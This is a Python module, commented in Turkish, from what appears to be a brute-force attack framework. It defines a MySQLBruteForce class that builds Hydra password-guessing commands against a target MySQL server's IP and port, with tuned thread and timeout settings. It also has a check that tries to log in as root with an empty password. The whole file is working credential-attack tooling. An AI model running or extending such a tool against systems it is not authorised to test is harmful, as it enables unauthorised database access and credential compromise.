from .base import BruteForceBase
from config import Ayarlar

class MySQLBruteForce(BruteForceBase):
    def __init__(self, hedef_ip, hedef_port=3306):
        super().__init__(hedef_ip, hedef_port, "MySQL")
        # MySQL için özel ayarlar
        self.thread_sayisi = Ayarlar.MYSQL_THREADS
        self.timeout = Ayarlar.MYSQL_TIMEOUT
        
    def _hydra_tipi(self):
        return "mysql"
        
    def _komut_olustur(self, kullanici_listesi, sifre_listesi):
        komut = super()._komut_olustur(kullanici_listesi, sifre_listesi)
        # MySQL için ek parametreler
        komut.extend(["-W", str(self.timeout)])  # Bağlantı timeout
        komut.extend(["-t", str(self.thread_sayisi)])  # Thread sayısı
        return komut
        
    def _mysql_baglanti_kontrol(self):
        # MySQL bağlantısını test etmek için basit bir kontrol
        try:
            import mysql.connector
            conn = mysql.connector.connect(
                host=self.hedef_ip,
                port=self.hedef_port,
                user="root",
                password="",
                connection_timeout=5,
                auth_plugin='mysql_native_password'
            )
            conn.close()
            return True
        except Exception:
            # mysql.connector yoksa socket ile basit kontrol
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((self.hedef_ip, self.hedef_port))
                sock.close()
                return result == 0
            except:
                return False